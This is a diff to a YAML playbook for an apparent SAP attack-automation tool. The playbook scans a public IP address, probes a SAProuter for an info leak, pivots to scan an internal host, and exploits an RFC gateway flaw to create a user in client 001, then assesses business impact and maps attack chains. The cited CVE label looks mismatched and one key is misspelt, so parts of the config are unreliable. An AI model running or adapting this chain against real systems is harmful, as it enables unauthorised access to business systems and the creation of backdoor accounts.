@@ -19,24 +19,20 @@ step_delay: 2
 
 steps:
   # --- 1. Register the SAProuter as a node --------------------------------
-  - action: add_system
-    sid: RD1
-    ip: 192.168.2.209
-    instance: "99"         # 99 = SAProuter convention (port 3299)
-
-  # --- 2. Fingerprint it (confirms system_type=SAPROUTER) -----------------
   - action: scan
-    target: RD1
+    targets: "80.56.140.21"
+    mode: fast
+    tmeout: 600
 
-  # --- 3. ROUTER_ADM info-leak probe (CVE-2017-12636) ---------------------
+  # --- 2. ROUTER_ADM info-leak probe (CVE-2017-12636) ---------------------
   - action: check_router_info
-    target: RD1
+    target: R15
 
-  # --- 4. Scan internal host via the SAProuter ----------------------------
+  # --- 3. Scan internal host via the SAProuter ----------------------------
   #   targets left empty would auto-extract from the info-leak result;
   #   here we target 192.168.2.29 explicitly, instances 40..45 only.
   - action: router_scan
-    target: RD1
+    target: R15
     targets: "192.168.2.29"
     inst_from: 40
     inst_to: 45
@@ -44,6 +40,32 @@ steps:
     concurrency: 10
     timeout: 5.0
 
-  # --- 5. Tidy the map so the new internal node is easy to spot -----------
+  # --- 4. Tidy the map so the new internal node is easy to spot -----------
   - action: layout
     mode: hierarchy
+
+  # --- 5. Check RFC GW vuln for W74 and create a user in client 001
+  - action: check_gw
+    target: W74
+
+  - action: create_user
+    target: W74
+    method: gw_exploit
+    client: "001"
+
+  # --- 6. Then check the business impact and highlight the attack chains
+  - action: impact_assess
+    target: W74
+    client: "001"
+
+  - action: impact_export
+    target: W74
+
+  - action: analyze_chains
+
+  - action: highlight_chain
+    index: 0
+
+  - action: impact_show
+    target: W74
+
